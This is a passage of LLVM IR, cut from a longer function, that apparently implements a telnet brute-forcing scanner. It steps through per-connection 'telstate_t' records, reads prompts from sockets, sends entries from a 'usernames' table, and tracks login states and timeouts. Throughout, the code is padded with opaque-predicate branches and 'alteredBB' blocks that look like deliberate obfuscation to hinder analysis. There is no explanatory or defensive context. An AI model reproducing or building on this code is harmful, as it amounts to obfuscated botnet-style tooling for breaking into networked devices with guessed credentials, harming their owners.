  %761 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %760
  %762 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %761, i32 0, i32 2
  store i8 3, i8* %762, align 8
  %763 = load i32, i32* @x.63
  %764 = load i32, i32* @y.64
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBBpart281, label %originalBB79alteredBB

originalBBpart281:                                ; preds = %originalBB79
  br label %771

; <label>:771:                                    ; preds = %originalBBpart281, %originalBBpart277
  %772 = load i32, i32* %2, align 4
  %773 = sext i32 %772 to i64
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %773
  %775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %774, i32 0, i32 8
  %776 = load i8*, i8** %775, align 8
  call void @llvm.memset.p0i8.i64(i8* %776, i8 0, i64 1024, i32 1, i1 false)
  %777 = load i32, i32* %2, align 4
  %778 = sext i32 %777 to i64
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %778
  %780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %779, i32 0, i32 2
  store i8 3, i8* %780, align 8
  br label %2959

; <label>:781:                                    ; preds = %694
  %782 = load i32, i32* @x.63
  %783 = load i32, i32* @y.64
  %784 = sub i32 %782, 1
  %785 = mul i32 %782, %784
  %786 = urem i32 %785, 2
  %787 = icmp eq i32 %786, 0
  %788 = icmp slt i32 %783, 10
  %789 = or i1 %787, %788
  br i1 %789, label %originalBB83, label %originalBB83alteredBB

originalBB83:                                     ; preds = %originalBB83alteredBB, %781
  %790 = load i32, i32* %2, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 0
  %794 = load i32, i32* %793, align 16
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 8
  %799 = load i8*, i8** %798, align 8
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 7
  %804 = load i16, i16* %803, align 16
  %805 = zext i16 %804 to i32
  %806 = call i32 @readUntil(i32 %794, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %799, i32 1024, i32 %805)
  %807 = icmp ne i32 %806, 0
  %808 = load i32, i32* @x.63
  %809 = load i32, i32* @y.64
  %810 = sub i32 %808, 1
  %811 = mul i32 %808, %810
  %812 = urem i32 %811, 2
  %813 = icmp eq i32 %812, 0
  %814 = icmp slt i32 %809, 10
  %815 = or i1 %813, %814
  br i1 %815, label %originalBBpart285, label %originalBB83alteredBB

originalBBpart285:                                ; preds = %originalBB83
  br i1 %807, label %816, label %850

; <label>:816:                                    ; preds = %originalBBpart285
  %817 = load i32, i32* @x.63
  %818 = load i32, i32* @y.64
  %819 = sub i32 %817, 1
  %820 = mul i32 %817, %819
  %821 = urem i32 %820, 2
  %822 = icmp eq i32 %821, 0
  %823 = icmp slt i32 %818, 10
  %824 = or i1 %822, %823
  br i1 %824, label %originalBB87, label %originalBB87alteredBB

originalBB87:                                     ; preds = %originalBB87alteredBB, %816
  %825 = load i32, i32* %2, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 6
  store i32 0, i32* %828, align 4
  %829 = load i32, i32* %2, align 4
  %830 = sext i32 %829 to i64
  %831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %830
  %832 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %831, i32 0, i32 7
  store i16 0, i16* %832, align 16
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 8
  %837 = load i8*, i8** %836, align 8
  call void @llvm.memset.p0i8.i64(i8* %837, i8 0, i64 1024, i32 1, i1 false)
  %838 = load i32, i32* %2, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 2
  store i8 5, i8* %841, align 8
  %842 = load i32, i32* @x.63
  %843 = load i32, i32* @y.64
  %844 = sub i32 %842, 1
  %845 = mul i32 %842, %844
  %846 = urem i32 %845, 2
  %847 = icmp eq i32 %846, 0
  %848 = icmp slt i32 %843, 10
  %849 = or i1 %847, %848
  br i1 %849, label %originalBBpart289, label %originalBB87alteredBB

originalBBpart289:                                ; preds = %originalBB87
  br label %2959

; <label>:850:                                    ; preds = %originalBBpart285
  %851 = load i32, i32* %2, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %852
  %854 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %853, i32 0, i32 0
  %855 = load i32, i32* %854, align 16
  %856 = load i32, i32* %2, align 4
  %857 = sext i32 %856 to i64
  %858 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %857
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %858, i32 0, i32 8
  %860 = load i8*, i8** %859, align 8
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 7
  %865 = load i16, i16* %864, align 16
  %866 = zext i16 %865 to i32
  %867 = call i32 @readUntil(i32 %855, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.29, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %860, i32 1024, i32 %866)
  %868 = icmp ne i32 %867, 0
  br i1 %868, label %869, label %921

; <label>:869:                                    ; preds = %850
  %870 = load i32, i32* %2, align 4
  %871 = sext i32 %870 to i64
  %872 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %871
  %873 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %872, i32 0, i32 6
  store i32 0, i32* %873, align 4
  %874 = load i32, i32* %2, align 4
  %875 = sext i32 %874 to i64
  %876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %875
  %877 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %876, i32 0, i32 7
  store i16 0, i16* %877, align 16
  %878 = load i32, i32* %2, align 4
  %879 = sext i32 %878 to i64
  %880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %879
  %881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %880, i32 0, i32 8
  %882 = load i8*, i8** %881, align 8
  %883 = call i8* @strstr(i8* %882, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.26, i32 0, i32 0)) #10
  %884 = icmp ne i8* %883, null
  br i1 %884, label %885, label %906

; <label>:885:                                    ; preds = %869
  %886 = load i32, i32* @x.63
  %887 = load i32, i32* @y.64
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBB91, label %originalBB91alteredBB

originalBB91:                                     ; preds = %originalBB91alteredBB, %885
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 2
  store i8 5, i8* %897, align 8
  %898 = load i32, i32* @x.63
  %899 = load i32, i32* @y.64
  %900 = sub i32 %898, 1
  %901 = mul i32 %898, %900
  %902 = urem i32 %901, 2
  %903 = icmp eq i32 %902, 0
  %904 = icmp slt i32 %899, 10
  %905 = or i1 %903, %904
  br i1 %905, label %originalBBpart293, label %originalBB91alteredBB

originalBBpart293:                                ; preds = %originalBB91
  br label %911

; <label>:906:                                    ; preds = %869
  %907 = load i32, i32* %2, align 4
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %908
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %909, i32 0, i32 2
  store i8 3, i8* %910, align 8
  br label %911

; <label>:911:                                    ; preds = %906, %originalBBpart293
  %912 = load i32, i32* %2, align 4
  %913 = sext i32 %912 to i64
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %913
  %915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %914, i32 0, i32 8
  %916 = load i8*, i8** %915, align 8
  call void @llvm.memset.p0i8.i64(i8* %916, i8 0, i64 1024, i32 1, i1 false)
  %917 = load i32, i32* %2, align 4
  %918 = sext i32 %917 to i64
  %919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %918
  %920 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %919, i32 0, i32 2
  store i8 3, i8* %920, align 8
  br label %2959

; <label>:921:                                    ; preds = %850
  %922 = load i32, i32* %2, align 4
  %923 = sext i32 %922 to i64
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %923
  %925 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %924, i32 0, i32 0
  %926 = load i32, i32* %925, align 16
  %927 = load i32, i32* %2, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 8
  %931 = load i8*, i8** %930, align 8
  %932 = load i32, i32* %2, align 4
  %933 = sext i32 %932 to i64
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %933
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %934, i32 0, i32 7
  %936 = load i16, i16* %935, align 16
  %937 = zext i16 %936 to i32
  %938 = call i32 @readUntil(i32 %926, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %931, i32 1024, i32 %937)
  %939 = icmp ne i32 %938, 0
  br i1 %939, label %940, label %974

; <label>:940:                                    ; preds = %921
  %941 = load i32, i32* @x.63
  %942 = load i32, i32* @y.64
  %943 = sub i32 %941, 1
  %944 = mul i32 %941, %943
  %945 = urem i32 %944, 2
  %946 = icmp eq i32 %945, 0
  %947 = icmp slt i32 %942, 10
  %948 = or i1 %946, %947
  br i1 %948, label %originalBB95, label %originalBB95alteredBB

originalBB95:                                     ; preds = %originalBB95alteredBB, %940
  %949 = load i32, i32* %2, align 4
  %950 = sext i32 %949 to i64
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %950
  %952 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %951, i32 0, i32 6
  store i32 0, i32* %952, align 4
  %953 = load i32, i32* %2, align 4
  %954 = sext i32 %953 to i64
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %954
  %956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %955, i32 0, i32 7
  store i16 0, i16* %956, align 16
  %957 = load i32, i32* %2, align 4
  %958 = sext i32 %957 to i64
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %958
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %959, i32 0, i32 8
  %961 = load i8*, i8** %960, align 8
  call void @llvm.memset.p0i8.i64(i8* %961, i8 0, i64 1024, i32 1, i1 false)
  %962 = load i32, i32* %2, align 4
  %963 = sext i32 %962 to i64
  %964 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %963
  %965 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %964, i32 0, i32 2
  store i8 5, i8* %965, align 8
  %966 = load i32, i32* @x.63
  %967 = load i32, i32* @y.64
  %968 = sub i32 %966, 1
  %969 = mul i32 %966, %968
  %970 = urem i32 %969, 2
  %971 = icmp eq i32 %970, 0
  %972 = icmp slt i32 %967, 10
  %973 = or i1 %971, %972
  br i1 %973, label %originalBBpart297, label %originalBB95alteredBB

originalBBpart297:                                ; preds = %originalBB95
  br label %2959

; <label>:974:                                    ; preds = %921
  %975 = load i32, i32* %2, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 8
  %979 = load i8*, i8** %978, align 8
  %980 = call i64 @strlen(i8* %979) #10
  %981 = trunc i64 %980 to i16
  %982 = load i32, i32* %2, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 7
  store i16 %981, i16* %985, align 16
  br label %986

; <label>:986:                                    ; preds = %974
  br label %987

; <label>:987:                                    ; preds = %986
  %988 = load i32, i32* @x.63
  %989 = load i32, i32* @y.64
  %990 = sub i32 %988, 1
  %991 = mul i32 %988, %990
  %992 = urem i32 %991, 2
  %993 = icmp eq i32 %992, 0
  %994 = icmp slt i32 %989, 10
  %995 = or i1 %993, %994
  br i1 %995, label %originalBB99, label %originalBB99alteredBB

originalBB99:                                     ; preds = %originalBB99alteredBB, %987
  %996 = load i32, i32* @x.63
  %997 = load i32, i32* @y.64
  %998 = sub i32 %996, 1
  %999 = mul i32 %996, %998
  %1000 = urem i32 %999, 2
  %1001 = icmp eq i32 %1000, 0
  %1002 = icmp slt i32 %997, 10
  %1003 = or i1 %1001, %1002
  br i1 %1003, label %originalBBpart2101, label %originalBB99alteredBB

originalBBpart2101:                               ; preds = %originalBB99
  br label %1004

; <label>:1004:                                   ; preds = %originalBBpart2101
  br label %1005

; <label>:1005:                                   ; preds = %1004
  br label %1006

; <label>:1006:                                   ; preds = %1005
  %1007 = load i32, i32* %2, align 4
  %1008 = sext i32 %1007 to i64
  %1009 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1008
  %1010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1009, i32 0, i32 6
  %1011 = load i32, i32* %1010, align 4
  %1012 = add i32 %1011, 10
  %1013 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1014 = icmp ult i32 %1012, %1013
  br i1 %1014, label %1015, label %1030

; <label>:1015:                                   ; preds = %1006
  %1016 = load i32, i32* %2, align 4
  %1017 = sext i32 %1016 to i64
  %1018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1017
  %1019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1018, i32 0, i32 0
  %1020 = load i32, i32* %1019, align 16
  %1021 = call i32 @sclose(i32 %1020)
  %1022 = load i32, i32* %2, align 4
  %1023 = sext i32 %1022 to i64
  %1024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1023
  %1025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1024, i32 0, i32 2
  store i8 0, i8* %1025, align 8
  %1026 = load i32, i32* %2, align 4
  %1027 = sext i32 %1026 to i64
  %1028 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1027
  %1029 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1028, i32 0, i32 3
  store i8 1, i8* %1029, align 1
  br label %1030

; <label>:1030:                                   ; preds = %1015, %1006
  br label %2958

; <label>:1031:                                   ; preds = %originalBBpart223
  %1032 = load i32, i32* %2, align 4
  %1033 = sext i32 %1032 to i64
  %1034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1033
  %1035 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1034, i32 0, i32 0
  %1036 = load i32, i32* %1035, align 16
  %1037 = load i32, i32* %2, align 4
  %1038 = sext i32 %1037 to i64
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1038
  %1040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1039, i32 0, i32 4
  %1041 = load i8, i8* %1040, align 2
  %1042 = zext i8 %1041 to i64
  %1043 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %1042
  %1044 = load i8*, i8** %1043, align 8
  %1045 = load i32, i32* %2, align 4
  %1046 = sext i32 %1045 to i64
  %1047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1046
  %1048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1047, i32 0, i32 4
  %1049 = load i8, i8* %1048, align 2
  %1050 = zext i8 %1049 to i64
  %1051 = getelementptr inbounds [10 x i8*], [10 x i8*]* @usernames, i64 0, i64 %1050
  %1052 = load i8*, i8** %1051, align 8
  %1053 = call i64 @strlen(i8* %1052) #10
  %1054 = call i64 @send(i32 %1036, i8* %1044, i64 %1053, i32 16384)
  %1055 = icmp slt i64 %1054, 0
  br i1 %1055, label %1056, label %1087

; <label>:1056:                                   ; preds = %1031
  %1057 = load i32, i32* @x.63
  %1058 = load i32, i32* @y.64
  %1059 = sub i32 %1057, 1
  %1060 = mul i32 %1057, %1059
  %1061 = urem i32 %1060, 2
  %1062 = icmp eq i32 %1061, 0
  %1063 = icmp slt i32 %1058, 10
  %1064 = or i1 %1062, %1063
  br i1 %1064, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %1056
  %1065 = load i32, i32* %2, align 4
  %1066 = sext i32 %1065 to i64
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1066
  %1068 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1067, i32 0, i32 0
  %1069 = load i32, i32* %1068, align 16
  %1070 = call i32 @sclose(i32 %1069)
  %1071 = load i32, i32* %2, align 4
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1072
  %1074 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1073, i32 0, i32 2
  store i8 0, i8* %1074, align 8
  %1075 = load i32, i32* %2, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 3
  store i8 1, i8* %1078, align 1
  %1079 = load i32, i32* @x.63
  %1080 = load i32, i32* @y.64
  %1081 = sub i32 %1079, 1
  %1082 = mul i32 %1079, %1081
  %1083 = urem i32 %1082, 2
  %1084 = icmp eq i32 %1083, 0
  %1085 = icmp slt i32 %1080, 10
  %1086 = or i1 %1084, %1085
  br i1 %1086, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %2959

; <label>:1087:                                   ; preds = %1031
  %1088 = load i32, i32* @x.63
  %1089 = load i32, i32* @y.64
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %1087
  %1096 = load i32, i32* %2, align 4
  %1097 = sext i32 %1096 to i64
  %1098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1097
  %1099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1098, i32 0, i32 0
  %1100 = load i32, i32* %1099, align 16
  %1101 = call i64 @send(i32 %1100, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1102 = icmp slt i64 %1101, 0
  %1103 = load i32, i32* @x.63
  %1104 = load i32, i32* @y.64
  %1105 = sub i32 %1103, 1
  %1106 = mul i32 %1103, %1105
  %1107 = urem i32 %1106, 2
  %1108 = icmp eq i32 %1107, 0
  %1109 = icmp slt i32 %1104, 10
  %1110 = or i1 %1108, %1109
  br i1 %1110, label %originalBBpart2109, label %originalBB107alteredBB

originalBBpart2109:                               ; preds = %originalBB107
  br i1 %1102, label %1111, label %1126

; <label>:1111:                                   ; preds = %originalBBpart2109
  %1112 = load i32, i32* %2, align 4
  %1113 = sext i32 %1112 to i64
  %1114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1113
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1114, i32 0, i32 0
  %1116 = load i32, i32* %1115, align 16
  %1117 = call i32 @sclose(i32 %1116)
  %1118 = load i32, i32* %2, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1119
  %1121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1120, i32 0, i32 2
  store i8 0, i8* %1121, align 8
  %1122 = load i32, i32* %2, align 4
  %1123 = sext i32 %1122 to i64
  %1124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1123
  %1125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1124, i32 0, i32 3
  store i8 1, i8* %1125, align 1
  br label %2959

; <label>:1126:                                   ; preds = %originalBBpart2109
  %1127 = load i32, i32* %2, align 4
  %1128 = sext i32 %1127 to i64
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1128
  %1130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1129, i32 0, i32 2
  store i8 4, i8* %1130, align 8
  br label %2958

; <label>:1131:                                   ; preds = %originalBBpart223
  %1132 = load i32, i32* %2, align 4
  %1133 = sext i32 %1132 to i64
  %1134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1133
  %1135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1134, i32 0, i32 6
  %1136 = load i32, i32* %1135, align 4
  %1137 = icmp eq i32 %1136, 0
  br i1 %1137, label %1138, label %1144

; <label>:1138:                                   ; preds = %1131
  %1139 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1140 = load i32, i32* %2, align 4
  %1141 = sext i32 %1140 to i64
  %1142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1141
  %1143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1142, i32 0, i32 6
  store i32 %1139, i32* %1143, align 4
  br label %1144

; <label>:1144:                                   ; preds = %1138, %1131
  %1145 = load i32, i32* @x.63
  %1146 = load i32, i32* @y.64
  %1147 = sub i32 %1145, 1
  %1148 = mul i32 %1145, %1147
  %1149 = urem i32 %1148, 2
  %1150 = icmp eq i32 %1149, 0
  %1151 = icmp slt i32 %1146, 10
  %1152 = or i1 %1150, %1151
  br i1 %1152, label %originalBB111, label %originalBB111alteredBB

originalBB111:                                    ; preds = %originalBB111alteredBB, %1144
  %1153 = load i32, i32* %2, align 4
  %1154 = sext i32 %1153 to i64
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1154
  %1156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1155, i32 0, i32 0
  %1157 = load i32, i32* %1156, align 16
  %1158 = load i32, i32* %2, align 4
  %1159 = sext i32 %1158 to i64
  %1160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1159
  %1161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1160, i32 0, i32 8
  %1162 = load i8*, i8** %1161, align 8
  %1163 = load i32, i32* %2, align 4
  %1164 = sext i32 %1163 to i64
  %1165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1164
  %1166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1165, i32 0, i32 7
  %1167 = load i16, i16* %1166, align 16
  %1168 = zext i16 %1167 to i32
  %1169 = call i32 @readUntil(i32 %1157, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1162, i32 1024, i32 %1168)
  %1170 = icmp ne i32 %1169, 0
  %1171 = load i32, i32* @x.63
  %1172 = load i32, i32* @y.64
  %1173 = sub i32 %1171, 1
  %1174 = mul i32 %1171, %1173
  %1175 = urem i32 %1174, 2
  %1176 = icmp eq i32 %1175, 0
  %1177 = icmp slt i32 %1172, 10
  %1178 = or i1 %1176, %1177
  br i1 %1178, label %originalBBpart2113, label %originalBB111alteredBB

originalBBpart2113:                               ; preds = %originalBB111
  br i1 %1170, label %1179, label %1259

; <label>:1179:                                   ; preds = %originalBBpart2113
  %1180 = load i32, i32* @x.63
  %1181 = load i32, i32* @y.64
  %1182 = sub i32 %1180, 1
  %1183 = mul i32 %1180, %1182
  %1184 = urem i32 %1183, 2
  %1185 = icmp eq i32 %1184, 0
  %1186 = icmp slt i32 %1181, 10
  %1187 = or i1 %1185, %1186
  br i1 %1187, label %originalBB115, label %originalBB115alteredBB

originalBB115:                                    ; preds = %originalBB115alteredBB, %1179
  %1188 = load i32, i32* %2, align 4
  %1189 = sext i32 %1188 to i64
  %1190 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1189
  %1191 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1190, i32 0, i32 6
  store i32 0, i32* %1191, align 4
  %1192 = load i32, i32* %2, align 4
  %1193 = sext i32 %1192 to i64
  %1194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1193
  %1195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1194, i32 0, i32 7
  store i16 0, i16* %1195, align 16
  %1196 = load i32, i32* %2, align 4
  %1197 = sext i32 %1196 to i64
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1197
  %1199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1198, i32 0, i32 8
  %1200 = load i8*, i8** %1199, align 8
  %1201 = call i8* @strstr(i8* %1200, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %1202 = icmp ne i8* %1201, null
  %1203 = load i32, i32* @x.63
  %1204 = load i32, i32* @y.64
  %1205 = sub i32 %1203, 1
  %1206 = mul i32 %1203, %1205
  %1207 = urem i32 %1206, 2
  %1208 = icmp eq i32 %1207, 0
  %1209 = icmp slt i32 %1204, 10
  %1210 = or i1 %1208, %1209
  br i1 %1210, label %originalBBpart2117, label %originalBB115alteredBB

originalBBpart2117:                               ; preds = %originalBB115
  br i1 %1202, label %1211, label %1232

; <label>:1211:                                   ; preds = %originalBBpart2117
  %1212 = load i32, i32* @x.63
  %1213 = load i32, i32* @y.64
  %1214 = sub i32 %1212, 1
  %1215 = mul i32 %1212, %1214
  %1216 = urem i32 %1215, 2
  %1217 = icmp eq i32 %1216, 0
  %1218 = icmp slt i32 %1213, 10
  %1219 = or i1 %1217, %1218
  br i1 %1219, label %originalBB119, label %originalBB119alteredBB

originalBB119:                                    ; preds = %originalBB119alteredBB, %1211
  %1220 = load i32, i32* %2, align 4
  %1221 = sext i32 %1220 to i64
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1221
  %1223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1222, i32 0, i32 2
  store i8 5, i8* %1223, align 8
  %1224 = load i32, i32* @x.63
  %1225 = load i32, i32* @y.64
  %1226 = sub i32 %1224, 1
  %1227 = mul i32 %1224, %1226
  %1228 = urem i32 %1227, 2
  %1229 = icmp eq i32 %1228, 0
  %1230 = icmp slt i32 %1225, 10
  %1231 = or i1 %1229, %1230
  br i1 %1231, label %originalBBpart2121, label %originalBB119alteredBB

originalBBpart2121:                               ; preds = %originalBB119
  br label %1253

; <label>:1232:                                   ; preds = %originalBBpart2117
  %1233 = load i32, i32* @x.63
  %1234 = load i32, i32* @y.64
  %1235 = sub i32 %1233, 1
  %1236 = mul i32 %1233, %1235
  %1237 = urem i32 %1236, 2
  %1238 = icmp eq i32 %1237, 0
  %1239 = icmp slt i32 %1234, 10
  %1240 = or i1 %1238, %1239
  br i1 %1240, label %originalBB123, label %originalBB123alteredBB

originalBB123:                                    ; preds = %originalBB123alteredBB, %1232
  %1241 = load i32, i32* %2, align 4
  %1242 = sext i32 %1241 to i64
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1242
  %1244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1243, i32 0, i32 2
  store i8 7, i8* %1244, align 8
  %1245 = load i32, i32* @x.63
  %1246 = load i32, i32* @y.64
  %1247 = sub i32 %1245, 1
  %1248 = mul i32 %1245, %1247
  %1249 = urem i32 %1248, 2
  %1250 = icmp eq i32 %1249, 0
